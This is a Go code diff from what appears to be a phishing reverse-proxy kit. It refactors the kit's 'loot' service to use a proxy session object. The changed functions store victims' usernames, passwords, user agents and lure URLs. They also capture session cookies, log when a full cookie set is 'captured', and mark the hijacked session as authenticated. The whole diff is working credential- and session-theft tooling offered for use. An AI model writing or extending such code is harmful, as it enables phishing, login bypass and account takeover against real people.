@@ -12,7 +12,6 @@ import (
 	"time"
 
 	"github.com/gofiber/fiber/v2"
-	"github.com/gofiber/fiber/v2/middleware/session"
 	"go.uber.org/multierr"
 	"gopkg.in/yaml.v3"
 )
@@ -209,14 +208,17 @@ type lootService struct {
 	requiredCookiesNum   int
 }
 
-func (s *lootService) SaveCreds(c *fiber.Ctx, info *APILoginInfo) error {
-	sess := getSession(c)
+func (s *lootService) SaveCreds(c *fiber.Ctx, info *APILoginInfo) (err error) {
+	sess := getProxySession(c)
+	if sess == nil {
+		return
+	}
 	dbInfo := &DBLoginInfo{
 		Username:  info.Username,
 		Password:  info.Password,
 		Date:      time.Now().UTC(),
 		SessionID: sess.ID(),
-		LureURL:   getLureURL(sess),
+		LureURL:   sess.LureURL(),
 	}
 	return s.credsRepo.SaveCreds(dbInfo)
 }
@@ -257,7 +259,7 @@ func (s *lootService) SaveUserAgent(c *fiber.Ctx) {
 	if userAgent == "" {
 		return
 	}
-	sess := getSession(c)
+	sess := getProxySession(c)
 	if sess == nil {
 		return
 	}
@@ -280,7 +282,10 @@ func (s *lootService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*htt
 	if s.requiredCookiesNum == 0 {
 		return
 	}
-	sess := getSession(c)
+	sess := getProxySession(c)
+	if sess == nil {
+		return
+	}
 	sessCtx := s.getOrCreateSessionContext(sess.ID())
 	sessCtx.mu.Lock()
 	defer sessCtx.mu.Unlock()
@@ -291,21 +296,21 @@ func (s *lootService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*htt
 		s.saveCookie(sessCtx, destURL, cookie)
 	}
 	if len(sessCtx.requiredCookies) == s.requiredCookiesNum {
-		log.Printf("lureURL: %s sid: %s session cookies are captured!\n", getLureURL(sess), sess.ID())
+		log.Printf("lureURL: %s sid: %s session cookies are captured!\n", sess.LureURL(), sess.ID())
 		err = s.saveCapturedSession(sess, sessCtx)
 		sessCtx.isAuthenticated = true
 	}
 	return
 }
 
-func (s *lootService) saveCapturedSession(sess *session.Session, sessCtx *sessionContext) error {
+func (s *lootService) saveCapturedSession(sess *proxySession, sessCtx *sessionContext) error {
 	cookies := make([]*SessionCookie, 0, len(sessCtx.allCookies))
 	for _, cookie := range sessCtx.allCookies {
 		cookies = append(cookies, cookie)
 	}
 	return s.sessionRepo.SaveSession(&DBCapturedSession{
 		SessionID: sess.ID(),
-		LureURL:   getLureURL(sess),
+		LureURL:   sess.LureURL(),
 		Cookies:   cookies,
 		UserAgent: sessCtx.userAgent,
 	})
@@ -326,7 +331,7 @@ func (s *lootService) getSessionContext(sessionID string) *sessionContext {
 }
 
 func (s *lootService) IsAuthenticated(c *fiber.Ctx) bool {
-	sess := getSession(c)
+	sess := getProxySession(c)
 	if sess == nil {
 		return false
 	}
@@ -414,7 +419,7 @@ func NewCookieService() CookieSaver {
 type cookieService struct{}
 
 func (*cookieService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*http.Cookie) error {
-	cookieJar := getCookieJar(c)
+	cookieJar := getProxySession(c).CookieJar()
 	cookieJar.SetCookies(destURL, cookies)
 	return nil
 }
